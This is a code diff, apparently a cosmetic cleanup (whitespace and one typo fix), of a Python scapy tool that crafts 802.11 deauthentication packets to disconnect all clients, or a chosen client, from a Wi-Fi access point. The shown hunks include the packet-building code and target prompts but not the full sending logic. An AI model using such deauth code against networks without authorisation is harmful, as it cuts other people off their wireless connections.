@@ -1,12 +1,12 @@
 from scapy.all import *
 import colors
 interface = ''
-client = '' 
+client = ''
 accessPoint = ''
 
 def wifiDeauthAP():
-  
-    
+
+
 #getting the information from user, interface, client, and AP mac addresses
   interface = input(colors.green('Select your MONITOR MODE interface (ex. \"wlan0mon\")\nSKWD>'))
   print('OK, ' + interface)
@@ -20,12 +20,12 @@ def wifiDeauthAP():
   print('__________________________________________________')
   print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient: All Clients\nAccess Point:' + accessPoint)
   print('__________________________________________________')
-  
+
   correct = input('Is this correct? (y/n):\n?>')
-  
+
   def deauthRouter():
     print('Building the packet.')
-    #using scapy to craft anf send deauth packet, thanks Abdou Rockikz!
+    #using scapy to craft and send deauth packet, thanks Abdou Rockikz!
     dot11 = Dot11(addr1=client, addr2=accessPoint, addr3=accessPoint)
     # stack them up
     packet = RadioTap()/dot11/Dot11Deauth(reason=7)
@@ -40,7 +40,7 @@ def wifiDeauthAP():
   elif correct == 'n':
     print('Exiting...')
     sys.exit()
-   
+
 def wifiDeauthClient():
   def deauthRouter():
     print('Building the packet.')
@@ -67,7 +67,7 @@ def wifiDeauthClient():
   print('__________________________________________________')
   print('Just to be sure, here is are the current settings:\nMonitor Mode Interface:' + interface + '\nClient:' + client + '\nAccess Point:' + accessPoint)
   print('__________________________________________________')
-  
+
   correct = input(colors.red('Is this correct? (y/n):\n?>'))
   def deauthClient():
     print('Building the packet.')
@@ -87,8 +87,8 @@ def wifiDeauthClient():
     print('Exiting...')
     sys.exit()
 
- 
-  
+
+
   #Feature coming soon, will be added to the above functions as one of the methods of selecting a target. -SK
 def scanForTarget():
     interface = input('Input Your MONITOR MODE Interface\nSKWD>')
@@ -103,7 +103,7 @@ def scanForTarget():
 
 
     sniff(iface=interface, prn = PacketHandler)
-  
+
 
   #Feature coming soon, checks whether or not a selected interface is in monitor mode, as it is required
   #to send deauth packets. -SK
